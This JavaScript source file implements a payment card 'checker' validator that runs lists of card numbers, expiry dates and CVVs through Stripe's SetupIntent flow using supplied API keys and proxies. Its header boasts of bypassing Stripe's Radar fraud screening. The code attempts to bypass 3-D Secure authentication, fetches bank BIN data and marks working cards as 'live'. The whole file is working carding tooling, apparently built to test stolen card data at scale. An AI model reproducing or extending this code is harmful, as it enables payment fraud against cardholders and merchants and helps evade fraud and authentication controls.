/**
 * SKBasedAuthValidator - SetupIntent-based $0 authorization validator
 * 
 * Validates cards using the PaymentMethod → SetupIntent flow with user-provided
 * Stripe SK/PK keys. This approach bypasses Radar and performs $0 authorization
 * directly with the bank.
 * 
 * Flow:
 * 1. Create PaymentMethod using PK key (via StripeSetupIntentClient)
 * 2. Create SetupIntent with confirm=true using SK key
 * 3. If 3DS required, attempt frictionless bypass
 * 4. Return SKBasedAuthResult with CVC check and status
 * 
 * Key benefits:
 * - SetupIntent bypasses Radar (no risk_level blocking)
 * - $0 authorization goes directly to bank
 * - Returns real bank response
 */

import { SKBasedAuthResult } from '../domain/SKBasedAuthResult.js';
import { StripeSetupIntentClient } from '../infrastructure/auth/StripeSetupIntentClient.js';
import { binLookupClient } from '../infrastructure/external/BinLookupClient.js';
import { classifyAuthResult, getDeclineReason } from '../utils/skbasedAuthClassifier.js';

export class SKBasedAuthValidator {
    constructor(options = {}) {
        this.proxyManager = options.proxyManager || null;
        this.setupIntentClient = options.setupIntentClient || new StripeSetupIntentClient({
            debug: options.debug,
            proxyManager: this.proxyManager
        });
        this.binLookup = options.binLookup || binLookupClient;
        this.debug = options.debug !== false;
    }

    /**
     * Log debug messages
     * @private
     */
    _log(message, data = null) {
        // Logging disabled
    }

    /**
     * Get validator name
     */
    getName() {
        return 'SKBasedAuthValidator';
    }

    /**
     * Parse a card line into card info object
     * @param {string} cardLine - Card line in format: number|mm|yy|cvv
     * @returns {object|null} - Parsed card info or null if invalid
     */
    parseCard(cardLine) {
        if (!cardLine || typeof cardLine !== 'string') return null;

        const parts = cardLine.split('|');
        if (parts.length !== 4) return null;

        let [number, expMonth, expYear, cvc] = parts.map(p => (p || '').trim());
        number = number.replace(/\s/g, '');

        if (number.length < 13) return null;

        // Normalize expiry year to 2 digits
        expYear = expYear.length === 4 ? expYear.slice(-2) : expYear;
        expMonth = expMonth.padStart(2, '0');

        return { number, expMonth, expYear, cvc };
    }

    /**
     * Check if error message indicates a timeout or network error
     * @private
     */
    _isTimeoutError(errorMessage) {
        if (!errorMessage) return false;
        const message = (errorMessage || '').toLowerCase();
        return message.includes('timeout') ||
            message.includes('etimedout') ||
            message.includes('econnreset') ||
            message.includes('econnrefused') ||
            message.includes('socket hang up') ||
            message.includes('network error') ||
            message.includes('stream has been aborted') ||
            message.includes('request aborted') ||
            message.includes('enotfound') ||
            message.includes('30000ms exceeded') ||
            message.includes('exceeded');
    }

    /**
     * Validate a card using the SetupIntent flow
     * 
     * @param {object} cardInfo - Card details { number, expMonth, expYear, cvc }
     * @param {object} options - Validation options
     * @param {string} options.skKey - Stripe secret key (sk_live_xxx or sk_test_xxx)
     * @param {string} options.pkKey - Stripe publishable key (pk_live_xxx or pk_test_xxx)
     * @param {object} options.proxy - Proxy configuration { host, port, type, username, password }
     * @param {string} options.gateway - Gateway identifier (default: 'skbased-auth')
     * @returns {Promise<SKBasedAuthResult>}
     */
    async validate(cardInfo, options = {}) {
        const startTime = Date.now();
        const {
            skKey,
            pkKey,
            proxy = null,
            gateway = 'skbased-auth'
        } = options;

        // Build full card string for result
        const fullCard = `${cardInfo.number}|${cardInfo.expMonth}|${cardInfo.expYear}|${cardInfo.cvc}`;
        const maskedCard = `${cardInfo.number.slice(0, 6)}******${cardInfo.number.slice(-4)}`;

        this._log(`Starting validation for ${maskedCard}`);

        // Base result data
        const baseData = {
            card: fullCard,
            gateway
        };

        try {
            // Step 1: Create PaymentMethod using PK key
            this._log('Step 1: Creating PaymentMethod...');
            const pmResult = await this.setupIntentClient.createPaymentMethod(
                {
                    number: cardInfo.number,
                    expMonth: cardInfo.expMonth,
                    expYear: cardInfo.expYear,
                    cvc: cardInfo.cvc
                },
                pkKey,
                { proxy }
            );

            if (!pmResult.success) {
                this._log(`PaymentMethod creation failed: ${pmResult.error}`);
                const duration = Date.now() - startTime;

                // Fetch BIN data even for failed PM creation
                const binData = await this._fetchBinData(cardInfo.number);

                // Check if this needs retry (network error, worker should not block)
                if (pmResult.needsRetry) {
                    this._log(`⚠️ Needs retry - returning immediately for requeue`);
                    return SKBasedAuthResult.error(pmResult.error || 'Request timeout', {
                        ...baseData,
                        ...binData,
                        isNetworkError: true,
                        needsRetry: true,
                        attemptNumber: pmResult.attemptNumber,
                        maxRetries: pmResult.maxRetries,
                        duration
                    });
                }

                // Check if this is a network/timeout error - treat as ERROR, not DECLINED
                if (pmResult.isNetworkError || this._isTimeoutError(pmResult.error)) {
                    this._log(`⚠️ Network/Timeout error - treating as ERROR`);
                    return SKBasedAuthResult.error(pmResult.error || 'Request timeout', {
                        ...baseData,
                        ...binData,
                        isNetworkError: true,
                        duration
                    });
                }

                // Classify the error
                const classification = classifyAuthResult(
                    pmResult.declineCode || pmResult.code,
                    null,
                    'requires_payment_method'
                );

                return new SKBasedAuthResult({
                    ...baseData,
                    ...binData,
                    status: classification.status,
                    message: pmResult.error || classification.message,
                    declineCode: pmResult.declineCode || pmResult.code,
                    declineReason: getDeclineReason(pmResult.declineCode || pmResult.code),
                    duration
                });
            }

            const paymentMethodId = pmResult.paymentMethodId;
            this._log(`PaymentMethod created: ${paymentMethodId}`);

            // Step 2: Create SetupIntent with confirm=true
            this._log('Step 2: Creating SetupIntent...');
            const siResult = await this.setupIntentClient.createSetupIntent(
                paymentMethodId,
                skKey,
                { proxy }
            );

            // Fetch BIN data for all processed cards
            const binData = await this._fetchBinData(cardInfo.number);

            if (!siResult.success) {
                this._log(`SetupIntent creation failed: ${siResult.error}`);
                const duration = Date.now() - startTime;

                // Check if this is a network/timeout error - treat as ERROR, not DECLINED
                if (siResult.isNetworkError || this._isTimeoutError(siResult.error)) {
                    this._log(`⚠️ Network/Timeout error - treating as ERROR`);
                    return SKBasedAuthResult.error(siResult.error || 'Request timeout', {
                        ...baseData,
                        ...binData,
                        paymentMethodId,
                        isNetworkError: true,
                        duration
                    });
                }

                // Classify the error
                const classification = classifyAuthResult(
                    siResult.declineCode || siResult.code,
                    null,
                    'requires_payment_method'
                );

                return new SKBasedAuthResult({
                    ...baseData,
                    ...binData,
                    status: classification.status,
                    message: siResult.error || classification.message,
                    declineCode: siResult.declineCode || siResult.code,
                    declineReason: getDeclineReason(siResult.declineCode || siResult.code),
                    errorCode: siResult.code,
                    errorType: siResult.errorType,
                    paymentMethodId,
                    duration
                });
            }

            this._log(`SetupIntent created: ${siResult.setupIntentId}, status: ${siResult.status}`);

            // Handle SetupIntent status
            if (siResult.status === 'succeeded') {
                // Card authorized successfully
                const duration = Date.now() - startTime;
                const classification = classifyAuthResult(null, siResult.cvcCheck, 'succeeded');

                this._log(`✅ Card authorized: ${classification.message}`);

                // Cancel SetupIntent to cleanup
                await this.setupIntentClient.cancelSetupIntent(siResult.setupIntentId, skKey, { proxy });

                return SKBasedAuthResult.live({
                    ...baseData,
                    ...binData,
                    message: classification.message,
                    cvcCheck: siResult.cvcCheck,
                    avsLine1Check: siResult.avsLine1Check,
                    avsPostalCheck: siResult.avsPostalCheck,
                    paymentMethodId,
                    setupIntentId: siResult.setupIntentId,
                    duration
                });
            }

            // Handle 3DS required
            if (siResult.status === 'requires_action' && siResult.nextAction) {
                this._log('Step 3: 3DS required, attempting bypass...');

                const bypassResult = await this.setupIntentClient.attempt3DSBypass(
                    siResult.nextAction,
                    pkKey,
                    { proxy }
                );

                if (bypassResult.success && bypassResult.bypassed) {
                    // Wait and check final status
                    await new Promise(r => setTimeout(r, 500));
                    const finalSI = await this.setupIntentClient.getSetupIntentDetails(
                        siResult.setupIntentId,
                        skKey,
                        { proxy }
                    );

                    const duration = Date.now() - startTime;

                    if (finalSI.status === 'succeeded') {
                        this._log('✅ 3DS bypass succeeded');

                        // Cancel SetupIntent to cleanup
                        await this.setupIntentClient.cancelSetupIntent(siResult.setupIntentId, skKey, { proxy });

                        return SKBasedAuthResult.live({
                            ...baseData,
                            ...binData,
                            message: '3DS Bypassed (Card Valid)',
                            cvcCheck: finalSI.cvcCheck || siResult.cvcCheck,
                            avsLine1Check: siResult.avsLine1Check,
                            avsPostalCheck: siResult.avsPostalCheck,
                            vbvStatus: 'Bypassed',
                            bypassed3DS: true,
                            paymentMethodId,
                            setupIntentId: siResult.setupIntentId,
                            duration
                        });
                    }

                    // 3DS bypass succeeded but final status is not succeeded
                    this._log(`3DS bypass succeeded but final status: ${finalSI.status}`);
                    return new SKBasedAuthResult({
                        ...baseData,
                        ...binData,
                        status: 'DECLINED',
                        message: finalSI.error || '3DS Failed',
                        declineCode: finalSI.declineCode,
                        declineReason: getDeclineReason(finalSI.declineCode),
                        vbvStatus: '3DS Failed',
                        bypassed3DS: true,
                        paymentMethodId,
                        setupIntentId: siResult.setupIntentId,
                        duration
                    });
                }

                // 3DS bypass failed - return exact 3DS status
                const duration = Date.now() - startTime;
                this._log('⚠️ 3DS bypass failed - requires authentication');

                // Determine exact 3DS message
                let message = '3DS Authentication Required';
                if (bypassResult.challengeRequired) {
                    message = '3DS Challenge Required';
                } else if (bypassResult.error) {
                    message = bypassResult.error;
                } else if (bypassResult.reason) {
                    message = bypassResult.reason;
                }

                return new SKBasedAuthResult({
                    ...baseData,
                    ...binData,
                    status: '3DS',
                    message,
                    cvcCheck: siResult.cvcCheck,
                    avsLine1Check: siResult.avsLine1Check,
                    avsPostalCheck: siResult.avsPostalCheck,
                    vbvStatus: '3DS Required',
                    paymentMethodId,
                    setupIntentId: siResult.setupIntentId,
                    duration
                });
            }

            // Handle requires_payment_method (declined)
            if (siResult.status === 'requires_payment_method') {
                const duration = Date.now() - startTime;
                const lastError = siResult.lastError || {};
                const declineCode = lastError.decline_code || lastError.code;

                const classification = classifyAuthResult(declineCode, siResult.cvcCheck, 'requires_payment_method');

                this._log(`❌ Card declined: ${classification.message}`);

                return new SKBasedAuthResult({
                    ...baseData,
                    ...binData,
                    status: classification.status,
                    message: classification.message,
                    declineCode,
                    declineReason: getDeclineReason(declineCode),
                    errorCode: lastError.code,
                    errorType: lastError.type,
                    cvcCheck: siResult.cvcCheck,
                    avsLine1Check: siResult.avsLine1Check,
                    avsPostalCheck: siResult.avsPostalCheck,
                    paymentMethodId,
                    setupIntentId: siResult.setupIntentId,
                    duration
                });
            }

            // Unknown status
            const duration = Date.now() - startTime;
            this._log(`Unknown SetupIntent status: ${siResult.status}`);

            return SKBasedAuthResult.error(`Unknown status: ${siResult.status}`, {
                ...baseData,
                ...binData,
                paymentMethodId,
                setupIntentId: siResult.setupIntentId,
                duration
            });

        } catch (error) {
            const duration = Date.now() - startTime;
            this._log(`❌ Exception: ${error.message}`);

            // Fetch BIN data even for errors
            const binData = await this._fetchBinData(cardInfo.number);

            return SKBasedAuthResult.error(error.message, {
                ...baseData,
                ...binData,
                duration
            });
        }
    }

    /**
     * Fetch BIN data for a card number
     * @private
     */
    async _fetchBinData(cardNumber) {
        try {
            const binData = await this.binLookup.lookup(cardNumber);
            if (binData && !binData.error) {
                return {
                    brand: binData.scheme?.toUpperCase() || null,
                    type: binData.type?.toUpperCase() || null,
                    category: binData.category?.toUpperCase() || null,
                    funding: binData.type || null,
                    bank: binData.bank || null,
                    country: binData.countryCode || null,
                    countryFlag: binData.countryEmoji || null
                };
            }
        } catch (error) {
            this._log(`BIN lookup failed: ${error.message}`);
        }
        return {};
    }
}

export default SKBasedAuthValidator;
